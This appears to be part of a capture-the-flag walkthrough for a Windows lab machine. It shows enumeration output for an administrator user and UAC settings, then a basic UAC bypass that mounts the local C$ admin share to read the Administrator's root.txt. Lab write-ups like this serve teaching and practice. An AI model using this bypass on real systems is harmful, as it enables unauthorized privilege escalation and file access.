# 25 - Administrator

# Batman is in administrators group
```bash
PS C:\Users\Batman> net user batman
net user batman
User name                    Batman
Full Name                    
Comment                      
User's comment               
Country/region code          001 (United States)
Account active               Yes
Account expires              Never

Password last set            2/3/2019 9:25:50 AM
Password expires             Never
Password changeable          2/3/2019 9:25:50 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   7/27/2021 3:40:25 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users                 
Global Group memberships     *None                  
The command completed successfully.
```


# UAC
```bash
͹ UAC Status                     
 If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries                                                                                                                               
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken:                                                                  
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.
```


EnableLUA: 1 means UAC is enabled


# [UAC Bypass](https://book.hacktricks.xyz/windows/authentication-credentials-uac-and-efs#very-basic-uac-bypass-full-file-system-access)
```
PS C:\Users\Batman> net use z: \\127.0.0.1\c$
PS C:\Users\Batman> z:
PS Z:\> dir
    Directory: Z:\

Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-----         2/3/2019   6:30 PM                inetpub                                                                
d-----        9/15/2018  12:49 PM                PerfLogs                                                               
d-r---         2/3/2019   9:29 AM                Program Files                                                          
d-----        9/15/2018   2:36 PM                Program Files (x86)                                                    
d-----         2/1/2019   9:56 AM                tomcat                                                                 
d-r---         2/3/2019   6:54 PM                Users                                                                  
d-----         2/3/2019   6:09 PM                Windows

PS Z:\Users\Administrator\Desktop> dir

    Directory: Z:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----         2/3/2019   9:32 AM             70 root.txt
```


